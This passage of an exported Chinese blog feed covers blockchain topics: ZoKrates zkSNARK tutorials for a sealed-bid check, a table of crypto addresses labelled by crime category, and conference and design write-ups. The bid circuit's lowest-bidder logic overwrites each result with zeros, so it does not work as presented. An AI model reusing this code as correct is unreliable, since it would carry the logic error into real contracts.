class="keyword">is</span> constructed <span class="keyword">from</span> the bids, no way to input_of_py a faulty bid</span><br><span class="line"></span><br><span class="line">//Reconstruct messages:</span><br><span class="line">//Note: Field element can be a value between <span class="number">0</span> <span class="keyword">and</span> p (p upper limit: <span class="number">2</span>^<span class="number">254</span>)</span><br><span class="line">//Makes an assumption that every bid will be <span class="number">64</span> bit number</span><br><span class="line">//Message <span class="keyword">in</span> the signature should be <span class="number">512</span> bits</span><br><span class="line"></span><br><span class="line">field[<span class="number">128</span>] bidoneunpacked = unpack128(bidone)</span><br><span class="line">field[<span class="number">512</span>] bidonemessage = [...[<span class="number">0</span>; <span class="number">384</span>], ...bidoneunpacked]</span><br><span class="line">field[<span class="number">128</span>] bidtwounpacked = unpack128(bidtwo)</span><br><span class="line">field[<span class="number">512</span>] bidtwomessage = [...[<span class="number">0</span>; <span class="number">384</span>], ...bidtwounpacked]</span><br><span class="line">field[<span class="number">128</span>] bidthreeunpacked = unpack128(bidthree)</span><br><span class="line">field[<span class="number">512</span>] bidthreemessage = [...[<span class="number">0</span>; <span class="number">384</span>], ...bidthreeunpacked]</span><br><span class="line"></span><br><span class="line">context = context()</span><br><span class="line"></span><br><span class="line">// Supplier <span class="number">1</span></span><br><span class="line"><span class="number">1</span> == verifyEddsa(R[<span class="number">0.</span><span class="number">.2</span>], S[<span class="number">0</span>], A[<span class="number">0.</span><span class="number">.2</span>], bidonemessage[<span class="number">0.</span><span class="number">.256</span>], bidonemessage[<span class="number">256.</span><span class="number">.512</span>], context)</span><br><span class="line">// Supplier <span class="number">2</span></span><br><span class="line"><span class="number">1</span> == verifyEddsa(R[<span class="number">2.</span><span class="number">.4</span>], S[<span class="number">1</span>], A[<span class="number">2.</span><span class="number">.4</span>], bidtwomessage[<span class="number">0.</span><span class="number">.256</span>], bidtwomessage[<span class="number">256.</span><span class="number">.512</span>], context)</span><br><span class="line">// Supplier <span class="number">3</span></span><br><span class="line"><span class="number">1</span> == verifyEddsa(R[<span class="number">4.</span><span class="number">.6</span>], S[<span class="number">2</span>], A[<span class="number">4.</span><span class="number">.6</span>], bidthreemessage[<span class="number">0.</span><span class="number">.256</span>], bidthreemessage[<span class="number">256.</span><span class="number">.512</span>], context)</span><br><span class="line"></span><br><span class="line">//Lowest bid should correllate <span class="keyword">with</span> supplier</span><br><span class="line">//To Do: write the simplest implementation to simplify, each of the below would be a <span class="built_in">range</span> proof</span><br><span class="line">field[<span class="number">3</span>] lowestbidder = [...[<span class="number">0</span>; <span class="number">3</span>]] //Save supplier <span class="keyword">and</span> the lowest bid</span><br><span class="line">lowestbidder = <span class="keyword">if</span> bidone &lt; bidtwo &amp;&amp; bidone &lt; bidthree then [A[<span class="number">0</span>], A[<span class="number">1</span>], bidone] <span class="keyword">else</span> [...[<span class="number">0</span>; <span class="number">3</span>]] fi</span><br><span class="line">lowestbidder = <span class="keyword">if</span> bidtwo &lt; bidone &amp;&amp; bidtwo &lt; bidthree then [A[<span class="number">2</span>], A[<span class="number">3</span>], bidtwo] <span class="keyword">else</span> [...[<span class="number">0</span>; <span class="number">3</span>]] fi</span><br><span class="line">lowestbidder = <span class="keyword">if</span> bidthree &lt; bidone &amp;&amp; bidthree &lt; bidtwo then [A[<span class="number">4</span>], A[<span class="number">5</span>], bidthree] <span class="keyword">else</span> [...[<span class="number">0</span>; <span class="number">3</span>]] fi</span><br><span class="line"></span><br><span class="line">//Now we have the lowest bid, supplier sig verified, and secret --&gt; ready for the merkle tree</span><br><span class="line">//<span class="number">512</span>bitpadded - same merkle tree <span class="keyword">as</span> ethereum</span><br><span class="line">//Leaf One: lowest bid + secret</span><br><span class="line">//Makes an assumption that every secret will be <span class="number">64</span> bit number</span><br><span class="line">field lowest = lowestbidder[<span class="number">2</span>]</span><br><span class="line">field[<span class="number">256</span>] lowestbidunpacked = unpack256(lowest)</span><br><span class="line">field[<span class="number">256</span>] secretunpacked = unpack256(secret)</span><br><span class="line">field[<span class="number">256</span>] leafone = sha256(lowestbidunpacked, secretunpacked)</span><br><span class="line"></span><br><span class="line">//Leaf Two: Curve point A: A[<span class="number">0</span>] + A[<span class="number">1</span>]</span><br><span class="line">//We know that A[<span class="number">0</span>] <span class="keyword">and</span> A[<span class="number">1</span>] will be <span class="number">64</span> bit numbers, need to unpack to <span class="number">256</span></span><br><span class="line">field[<span class="number">256</span>] a0unpacked = unpack256(A[<span class="number">0</span>])</span><br><span class="line">field[<span class="number">256</span>] a1unpacked = unpack256(A[<span class="number">1</span>])</span><br><span class="line">field[<span class="number">256</span>] leaftwo = sha256(a0unpacked, a1unpacked)</span><br><span class="line"></span><br><span class="line">//Build the root of leaf one + leaf two</span><br><span class="line">field[<span class="number">256</span>] root = sha256(leafone, leaftwo)</span><br><span class="line"></span><br><span class="line">//Before returning, compress back to field element root - split off <span class="number">128</span> bits</span><br><span class="line">res0 = pack128(root[.<span class="number">.128</span>])</span><br><span class="line">res1 = pack128(root[<span class="number">128.</span>.])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [res0, res1]</span><br></pre></td></tr></table></figure>

<h4 id="2-编译"><a href="#2-编译" class="headerlink" title="2.编译"></a>2.编译</h4><p><code>zokrates compile -i verifybid.code</code></p>
<p>生成 out 和 out.code 文件。其中 out 文件为 102M，out.code 文件为 60M，文件 size 较大。</p>
<h4 id="3-设置"><a href="#3-设置" class="headerlink" title="3.设置"></a>3.设置</h4><p><code>zokrates setup</code></p>
<p>生成 proving.key 和 verification.key 文件。其中 proving.key 为 121M，文件较大。</p>
<h4 id="4-执行程序"><a href="#4-执行程序" class="headerlink" title="4.执行程序"></a>4.执行程序</h4><p><code>zokrates compute-witness -a 10055980565918579776429468085502320403896861311334950973306171539247124720876 9872212025624827705538064352986283580914984702567748676648365783032194062540 15914440638590293656936968551196129378835493705090190454426890248467449623197 7164401624892807842686423552737135338148312648059491863415011813391162897156 17656893400745400645892949581714190787095935883004706460374622673779099869831 13238137875306891162631161684759202257598937454005976664682588856632564854848 14897476871502190904409029696666322856887678969656209656241038339251270171395 16668832459046858928951622951481252834155254151733002984053501254009901876174 14897476871502190904409029696666322856887678969656209656241038339251270171395 16668832459046858928951622951481252834155254151733002984053501254009901876174 14897476871502190904409029696666322856887678969656209656241038339251270171395 16668832459046858928951622951481252834155254151733002984053501254009901876174 6460329147541296150725376868570071708599740324087744825213520062979428542760 8063340131639693693865282091868641282847827816145781069349300386706996098818 21548706238088528999687556989620717323700520797702367873886065001951944889761 45 500 400 300</code></p>
<p>-a 后面为执行程序的参数，即对应着<strong>verifybid.code</strong>中的入参 private field[6] R, field[6] A, field[3] S, private field secret, private field bidone, private field bidtwo, private field bidthree</p>
<p>其中的 500，400，300 即为 3 方的报价，此处可在前序的智能合约中编写为下面的逻辑：</p>
<p>party one，输入 500，执行 smart contract，</p>
<p>party two，输入 400，执行 smart contract，</p>
<p>party three，输入 300，执行smart contract，</p>
<p>smart contract 收集到法定报价数量之后，verifier 端收到 event，执行 step5 和 step6。</p>
<p>其余参数内容来自<a href="https://github.com/WillZhuang/zkp-workshop-project/blob/master/input_files/inputs_of_command_paras">inputs_of_command_paras</a></p>
<h4 id="5-生成证明"><a href="#5-生成证明" class="headerlink" title="5.生成证明"></a>5.生成证明</h4><p><code>zokrates generate-proof</code></p>
<p>生成 witness 文件。其中 witness 文件为 82M，文件较大。</p>
<h4 id="6-导出-solidity-verifier"><a href="#6-导出-solidity-verifier" class="headerlink" title="6.导出 solidity verifier"></a>6.导出 solidity verifier</h4><p><code>zokrates export-verifier</code></p>
<p>生成<a href="https://github.com/WillZhuang/zkp-workshop-project/blob/master/contracts/Verifier.sol">Verifier.sol</a>。</p>
<h4 id="7-编写合约"><a href="#7-编写合约" class="headerlink" title="7.编写合约"></a>7.编写合约</h4><p>编写<a href="https://github.com/WillZhuang/zkp-workshop-project/blob/master/contracts/Bid_operator.sol">Bid_operator.sol</a>合约，引用 verifyTx 函数。</p>
<h4 id="8-使用-truffle-部署合约"><a href="#8-使用-truffle-部署合约" class="headerlink" title="8.使用 truffle 部署合约"></a>8.使用 truffle 部署合约</h4><p><a href="https://github.com/WillZhuang/zkp-workshop-project/blob/master/migrations/2_deploy_Verifier.js">2_deploy_Verifier.js</a> 和 <a href="https://github.com/WillZhuang/zkp-workshop-project/blob/master/migrations/3_deploy_Bid_operator.js">3_deploy_Bid_operator.js</a> 作为配置文件。</p>
<h4 id="9-测试"><a href="#9-测试" class="headerlink" title="9.测试"></a>9.测试</h4><p><a href="https://github.com/WillZhuang/zkp-workshop-project/tree/master/test">test/bid_operator.js</a> 中的a, b, c 和 input 均来自于<a href="https://github.com/WillZhuang/zkp-workshop-project/blob/master/zkp_files/proof.json">proof.json</a>。</p>
<h4 id="回头来总结一下："><a href="#回头来总结一下：" class="headerlink" title="回头来总结一下："></a>回头来总结一下：</h4><p>1.本次的 bid case 的目的为验证operator选择了最低的 bid 报价，并且验证了该 bid 为 supplier 所提供；</p>
<p><strong>不能证明</strong> supplier one，two，three 之间互相<strong>看不到</strong>其他 supplier 的 bid。</p>
<p>2.zokrates默认的证明算法为 <a href="https://eprint.iacr.org/2016/260">G16</a>，<a href="https://zokrates.github.io/reference/proving_schemes.html">根据 zokrates 的说明</a>，在使用了签名和 ethereum address 作为proofs 证明的情况下，G16 是安全的。并且 G16 无需引用<strong>libsnark</strong>，生成 witness 和 proof 的速度大大加快，使用配置文件的 size 大大降低。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>一些区块链犯罪地址的样例</title>
    <url>/2025/01/17/%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%9D%97%E9%93%BE%E7%8A%AF%E7%BD%AA%E5%9C%B0%E5%9D%80%E7%9A%84%E6%A0%B7%E4%BE%8B/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th><strong>Risk Category</strong></th>
<th><strong>Ethereum (fix 42 length)</strong></th>
<th><strong>Bitcoin (A string that starts with the letter 1 or 3 or bc1 )</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Sanction</td>
<td>0xfeed25Fc6Eae234c5eEfB3891cA18Bd4312a746f</td>
<td>32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM</td>
</tr>
<tr>
<td>Criminal Organisation</td>
<td>0x098B716B8Aaf21512996dC57EB0615e2383E2f96</td>
<td>32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM</td>
</tr>
<tr>
<td>Dark Market - Decentralised</td>
<td>0x8589427373d6d84e98730d7795d8f6f8731fda16</td>
<td>1CounterpartyXXXXXXXXXXXXXXXUWLpVr</td>
</tr>
<tr>
<td>Gambling</td>
<td>0x974CaA59e49682CdA0AD2bbe82983419A2ECC400</td>
<td>1dice8EMZmqKvrGE4Qc9bUFf9PX3xaYDp</td>
</tr>
<tr>
<td>Law Enforcement</td>
<td>0xdcbEfFBECcE100cCE9E4b153C4e15cB885643193</td>
<td>3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG</td>
</tr>
<tr>
<td>Malware</td>
<td>0x0A52eCAa61268C6a5Cf9Cd6b1378531A4672601B</td>
<td>1HB5XMLmzFVj8ALj6mfBsbifRoD4miY36v</td>
</tr>
<tr>
<td>Thief</td>
<td>0x9F12243D60c301d4E01a3d24bb620e8Ffb40f855</td>
<td>bc1qcygs9dl4pqw6atc4yqudrzd76p3r9cp6xp2kny 1HQ3Go3ggs8pFnXuHVHRytPCq5fGG8Hbhx</td>
</tr>
<tr>
<td>unknown (no risk so far)</td>
<td>0x6d2e03b7EfFEae98BD302A9F836D0d6Ab0002766</td>
<td>bc1pc24kj26d0hxh6xllcyedqazeqn7erqkykjhfepffxpp26ulq9a0q8q8vht</td>
</tr>
</tbody></table>
<p>Below are the characteristics of different types of Bitcoin addresses:</p>
<ol>
<li>P2PKH Address (Pay-to-PubKey-Hash):<br> • Starts with the letter “1”.<br> • Length is 26 to 35 characters.</li>
<li>P2SH Address (Pay-to-Script-Hash):<br> • Starts with the letter “3”.<br> • Length is 26 to 35 characters.</li>
<li>Bech32 Address (SegWit Address):<br> • Starts with “bc1”.<br> • Length is 42 to 62 characters.</li>
</ol>
<p>另外，Thief on Solana</p>
<ul>
<li>CEzN7mqP9xoxn2HdyW6fjEJ73t7qaX9Rp2zyS6hb3iEu  </li>
<li>5WwBYgQG6BdErM2nNNyUmQXfcUnB68b6kesxBywh1J3n  </li>
</ul>
<p>Scam on ETH</p>
<ul>
<li>0x84eb60e6732848f837f48402dcfff25e3d3d9304</li>
</ul>
]]></content>
      <tags>
        <tag>金融</tag>
        <tag>区块链地址</tag>
        <tag>犯罪</tag>
      </tags>
  </entry>
  <entry>
    <title>zokrates-基于ethereum的zkp-I-介绍</title>
    <url>/2019/07/22/zokrates-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84zkp-I-%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h3 id="Zokrates"><a href="#Zokrates" class="headerlink" title="Zokrates"></a>Zokrates</h3><p><a href="https://github.com/Zokrates/ZoKrates">ZoKrates</a>是以太坊上<a href="https://github.com/scipr-lab/libsnark">zkSNARKs</a>的工具箱。它可以帮助您在DApp中使用可验证的计算，从高级语言的程序规范到生成计算证明，以及在Solidity中验证这些证明。</p>
<p>闲话少叙，开搞</p>
<p>1.编写 .code 文件</p>
<p>.code 文件是证明的逻辑内容，函数的返回内容为 field、field[n]。</p>
<p>2.1 compile，编译 .code 文件，Zokrates内部生成数字电路，没有指定文件名称的话，默认生成 ./out.code</p>
<p><code>./zokrates compile -i root.code</code></p>
<p>2.2 perform the setup phase，进行安装。为 ./out.code 中的已编译程序生成可信设置。在./proving.key和./verifying.key处创建一个证明密钥和一个验证密钥。这些密钥源自随机源，通常称为“有毒废物”。任何有权访问随机源的人都可以生成假证明，该证明将由协议后的验证者接受。</p>
<p><code>./zokrates setup</code></p>
<p>2.3 execute the program，执行证明。计算在./out.code中找到的已编译程序的witness和程序的参数。witness是变量的有效分配，包括计算结果。-a 后面跟着程序的参数，用空格分隔。<br>在./witness创建一个witness文件</p>
<p><code>./zokrates compute-witness -a 337 113569</code></p>
<p>2.4 generate a proof of computation，生成 proof（证明）。使用./proving.key中的证明密钥，生成./out.code的证明，从而得到./witness。</p>
<p><code>./zokrates generate-proof</code></p>
<p>2.5 export a solidity verifier，使用./verifying.key上的验证密钥，生成一个Solidity合约，其中包含生成的验证密钥和公共函数，以验证./out.code上已编译程序的解决方案。<br>在./verifier.sol被创建。</p>
<p><code>./zokrates export-verifier</code></p>
<p>3.通过验证者合同，可以检查此证明。例如，使用web3，调用将如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Verifier.at(<span class="xml"><span class="tag">&lt;<span class="name">verifier</span> <span class="attr">contract</span> <span class="attr">address</span>&gt;</span>).verifyTx(A, A_p, B, B_p, C, C_p, H, K, [...publicInputs, ...outputs])</span></span><br></pre></td></tr></table></figure>

<p>A, A_p, B, B_p, C, C_p, H, K的值，以及publicInputs和 outputs 均来自于步骤2.4中生成的proof.json文件。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>万向的产业区块链解决方案</title>
    <url>/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>在28日的“分布式认知工业互联网”分论坛上，万向区块链执行总裁王允臻表示，数字化转型下的新型制造业是由数据驱动，全生命周期管理，平台化公共服务，利用相关方分布式参与。传统制造业的特点是流程驱动管理，流程是主题，数据是附属。工业互联网平台的特点是数据驱动管理，数据是主题，流程是附属。分布式认知工业互联网的特点是自组织自协同，区块链、隐私计算和知识图谱等作为技术支撑，分布式企业相互协同，数据分布式存储。</p>
<p>参考链接==&gt; <a href="https://mp.weixin.qq.com/s?__biz=MzI3MzYxNDg1Nw==&mid=2247488517&idx=1&sn=2aa8e5814c48846626386c1595e6af57&chksm=eb21c563dc564c752d75c7cff8582da9e819a98b6d08fb6d1be044bc51f25a81def46ae0937b&scene=126&sessionid=1603956935&key=9255e861c291e6d5c5f1f47ab41266ffa847e82a8015a4140df7b36429f3890f0654558e207ef744f7f92ecaec01617ac3973f3b7e4ddea725abc020c8eeea363f309572b8d1e190bc2b2a6c1d0975f17ddb363e4535151e4ac188393304d8e4557ac160b813856547d9647f8084616091721d91371f978130fd5e196b5c5422&ascene=1&uin=MjY4NjE1NTk4MQ==&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=AWZKG04vpm/WJ4ANoZCPz6A=&pass_ticket=Cmy377dXVM9xjKGymbGKVjLX9vQaqUDCvislIUalp5Ypp5ijL+H18//vMndC5gny&wx_header=0">万向区块链王允臻详解什么是“分布式认知工业互联网</a></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/3.JPG"></p>
<p>分布式认知到底是什么？三大技术底座：区块链、隐私计算、知识图谱。</p>
<p><strong>首先是隐私计算</strong>，它解决的是数据安全及主权的问题，当前的工业互联网面临的挑战之一就是是“鸡生蛋，还是蛋生鸡”的问题。如果一个工业互联网平台不能给企业、政府带来明确的价值，那企业或者政府为什么要承担这个风险，把自己的数据分享出来呢？可是没有企业的数据，就无法打造超出零和博弈的商业模式。巧妇难为无米之炊。那么，如何突破这种封闭模式呢？以可信的方式让基于业务需要的多源异构的工业数据上传到平台上以密文的形式多方协同计算，将会是一个极好的突破口。</p>
<p><strong>第二个是区块链</strong>，它主要解决的问题是分布式数据资产的存储与调用、分布式商业模式的构建，以及价值的交换、激励及治理机制的构建，还有相应的企业、行业及产业的管理。</p>
<p><strong>第三个是知识图谱</strong>，它是对宏观数据、企业小规模定向数据从降本增效的层面来进行优化和引导，同时也会通过产业知识图谱及发展趋势预测来助力政府进行产业格局的布局及优化。发现问题、及时加以解决；发现机会、及时捕捉机会。</p>
<p>以隐私计算、区块链、知识图谱为支撑的分布式认知工业互联网，必将快速推进从数字化到价值化的阶段跨越。<strong>在隐私计算方面</strong>，我们基于多年积累的生态伙伴，能够解决必要数据上平台的问题，也通过跟各地政府的合作，解决上什么样的平台、如何构建及定义平台、平台能够解决什么样的业务痛点、商业模式又如何打造的问题；<strong>在区块链方面</strong>，我们对治理模式、特别是激励模式方面有多年的积累与实践，比如建立工分制、在产业合作中的企业及行业根据贡献获取相应的收益；<strong>在知识图谱方面</strong>，结合工业大数据与AI的技术，让数据的价值发挥到极致。</p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/7.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/10.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/11.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/12.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/13.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/14.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/15.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/16.JPG"></p>
<p>关于知识图谱的能力展示：</p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/17.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/18.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/19.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/20.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/21.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/22.JPG"></p>
<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/23.JPG"></p>
<p><a href="https://www.datayes.com/">https://www.datayes.com/</a></p>
]]></content>
  </entry>
  <entry>
    <title>中小保险公司区块链再保项目应用探索</title>
    <url>/2019/07/25/%E4%B8%AD%E5%B0%8F%E4%BF%9D%E9%99%A9%E5%85%AC%E5%8F%B8%E5%8C%BA%E5%9D%97%E9%93%BE%E5%86%8D%E4%BF%9D%E9%A1%B9%E7%9B%AE%E5%BA%94%E7%94%A8%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<p>区块链再保项目上线，同时本人代表保交所与再保参与方撰写的《中小保险公司区块链再保项目应用探索》入选<a href="http://www.modernbankers.com/">《当代金融家》</a></p>
<p>2017.6</p>
<p><img src="/2019/07/25/%E4%B8%AD%E5%B0%8F%E4%BF%9D%E9%99%A9%E5%85%AC%E5%8F%B8%E5%8C%BA%E5%9D%97%E9%93%BE%E5%86%8D%E4%BF%9D%E9%A1%B9%E7%9B%AE%E5%BA%94%E7%94%A8%E6%8E%A2%E7%B4%A2/cover.jpeg"></p>
<p><img src="/2019/07/25/%E4%B8%AD%E5%B0%8F%E4%BF%9D%E9%99%A9%E5%85%AC%E5%8F%B8%E5%8C%BA%E5%9D%97%E9%93%BE%E5%86%8D%E4%BF%9D%E9%A1%B9%E7%9B%AE%E5%BA%94%E7%94%A8%E6%8E%A2%E7%B4%A2/paper.jpeg"></p>
]]></content>
      <tags>
        <tag>paper</tag>
      </tags>
  </entry>
  <entry>
    <title>为区块链做设计有什么不同</title>
    <url>/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/</url>
    <content><![CDATA[<p>—即如何设计“可信”技术的信任。<br>翻译原文： <a href="https://media.consensys.net/designing-for-blockchain-whats-different-and-what-s-at-stake-b867eeade1c9">https://media.consensys.net/designing-for-blockchain-whats-different-and-what-s-at-stake-b867eeade1c9</a><br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/1.png"><br>区块链技术正在重新定义信任，改变我们如何思考日常生活的结构，从身份、经济以及政府。它推动设计师进行系统和更大规模的思考 - 重新定义分散形式的未来团队的角色和价值。</p>
<p>如果我们不解决人们实际存在的问题，就无法实现区块链的未来。</p>
<p>我最近的目标是让这个领域有更多的设计师：更多的同理心，更多的用户研究，更多的设计思维，以及更多的关注现在遇到的用户。</p>
<p>人们经常问：“区块链设计有什么不同？”我想给出更好的答案。这个答案从问正确的问题开始：设计信任的真正含义是什么？</p>
<h3 id="为信任1-0做设计"><a href="#为信任1-0做设计" class="headerlink" title="为信任1.0做设计"></a>为信任1.0做设计</h3><p>早在2016年中，就开始在IBM开展区块链工作 - 首先是开发工具来获得和维护区块链网络，然后在短时间内发布潜在的身份识别产品。此时，并没有真正意识到在IBM和Hyperledger平台上所做的超越区块链的大局。加密货币热潮还没有真正开始。我从来没有在电视上看到任何加密货币的报道，朋友当然不知道我在说什么。</p>
<p>在加入区块链团队的过程中，记得看过关于比特币的视频，了解了其中的运行原理。但Hyperledger中是没有加密货币的。关于比特币如何工作 - 挖掘，采矿奖励，防止双重开支的保障措施 - 都不在Hyperledger中。因为比特币存在品牌问题，IBM的区块链人员并没有重视，所以也没有真正讨论加密货币。</p>
<p>IBM关注的是区块链的业务成果：节约成本，提高效率，缩短跟踪供应链上货物的时间。我仍然有很多关于激励和私人网络的问题，但是都没有得到解决。</p>
<p>然后，在很短时间内从事了关于身份产品的工作。 我看到了区块链上自我主权认同的巨大潜力，我被迷住了。 这是一个真正帮助人们的机会 - 无证件，被贩运者，边缘案件，身份被盗的人。 这是一个让人们控制自己的数据并帮助他们的机会，而不是集中式的机构，如果他们想要的话，可以通它赚钱。 这时，区块链开始感觉像一场革命。 当你消除所有的障碍并将控制权交还给人时，小鱼可以与大鱼竞争。<br><img src="/2018/03/28/%E4%B8%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E5%81%9A%E8%AE%BE%E8%AE%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/2.png"><br>在2017年初，我写了关于如何在IBM设计区块链的问题 - 现在称之为Designing for Trust 1.0。 当时看到的是无法真正使用的应用程序，没有明确的流程。 我们一直在追求工程决策，扭曲用户体验，以适应已经构建的内容。 所以，我只是用以人为中心的常规设计原则来解决问题。有过分使用行话（专业术语）问题，并强调显示哈希值。 我认为这是因为大多数应用程序都是为想要看到区块链工作原理的其他开发人员提供的演示。没有人在谈论最终用户。</p>
<p>所以我和同事们进行了最佳猜测，并试图使设计成为交互的重要组成部分。但它仍然是一个表面层，一个附加组件。 我们正在努力尝试和改造一种值得信赖的体验。</p>
<p>设计理论的要点是：</p>
<ul>
<li>避免行话（生僻的专业词汇）和不可操作的数据（hash 值）。</li>
<li>始终如一。使用设计系统。</li>
<li>使用现有的 UX 模式。</li>
<li>创建积极的指导和反馈。</li>
<li>允许并预测错误。</li>
<li>设计区块链的全球性 — 本地化，设备不可知论。</li>
</ul>
<p>上述内容看起来大部分是合理的。很多都是通过一致的视觉设计完成的。不需要华丽的动画（当用户没有明确地告诉它时，事物会移动）以及过多的交互流程。当用户遇到新事物和复杂事物时，这些都是优秀设计师会采用的。</p>
